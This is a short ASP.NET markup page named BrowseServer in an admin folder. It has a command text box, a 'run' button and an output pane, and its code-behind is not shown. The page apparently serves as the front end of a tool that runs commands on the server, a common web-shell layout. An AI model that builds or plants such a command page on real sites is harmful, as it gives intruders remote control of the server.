<%@ Page Language="C#" AutoEventWireup="true" CodeFile="BrowseServer.aspx.cs" Inherits="admin_BrowseServer" %>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <title></title>
    <link href="../main.css" rel="stylesheet" type="text/css" />
</head>
<body dir="ltr">
    <form id="form1" runat="server" dir="ltr">
        <input type="hidden" value="" id="hidden_location" runat="server" />
        <asp:TextBox ID="tb_command" runat="server"></asp:TextBox>
        <asp:Button ID="command_read" Text="run" runat="server" OnClick="command_read_Click" />
        <br />
        <div id="div_text" runat="server" style="overflow:auto;height:200px;" />
    </form>
</body>
</html>